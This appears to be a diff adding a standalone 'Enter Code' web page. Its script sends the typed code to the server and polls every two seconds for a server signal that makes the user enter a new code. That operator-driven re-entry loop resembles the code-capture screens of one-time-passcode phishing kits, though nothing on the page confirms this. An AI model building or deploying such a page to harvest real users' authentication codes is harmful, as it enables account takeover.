@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code</title>
+    <link href="https://fonts.googleapis.com/css?family=Inter:400,600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #16b6ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', Arial, sans-serif;
+        }
+        .container {
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+            padding: 40px 32px 32px 32px;
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .icon {
+            background: #16b6ff;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .icon svg {
+            width: 32px;
+            height: 32px;
+            color: #fff;
+        }
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            color: #222;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+        input[type="text"] {
+            padding: 12px 16px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            background: #f8faff;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input[type="text"]:focus {
+            border: 1.5px solid #16b6ff;
+        }
+        button {
+            background: #16b6ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 0;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #0e8ecf;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">
+            <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0-1.104.896-2 2-2s2 .896 2 2-.896 2-2 2-2-.896-2-2zm0 0V7m0 4v4m0 0c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2z"/>
+            </svg>
+        </div>
+        <h2>Enter Code</h2>
+        <form id="code-form">
+            <input type="text" id="code-input" name="code" placeholder="Enter your code" required autocomplete="off">
+            <button type="submit">Send</button>
+        </form>
+        <div id="message" style="margin-top:14px;color:#16b6ff;font-size:1rem;font-weight:500;"></div>
+    </div>
+    <script>
+        let lastCode = '';
+        document.getElementById('code-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const code = document.getElementById('code-input').value;
+            lastCode = code;
+            try {
+                const response = await fetch('/send_code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code })
+                });
+                if (response.ok) {
+                    document.getElementById('message').textContent = 'Code sent!';
+                } else {
+                    document.getElementById('message').textContent = 'Error sending code';
+                }
+            } catch (err) {
+                document.getElementById('message').textContent = 'Error sending code';
+            }
+        });
+        // Polling for request_again
+        setInterval(async function() {
+            if (!lastCode) return;
+            try {
+                const resp = await fetch('/check_request_again?code=' + encodeURIComponent(lastCode));
+                const txt = await resp.text();
+                if (txt === 'true') {
+                    document.getElementById('code-input').value = '';
+                    document.getElementById('message').textContent = 'Please enter the code again';
+                    lastCode = '';
+                }
+            } catch (e) {}
+        }, 2000);
+    </script>
+</body>
+</html> 
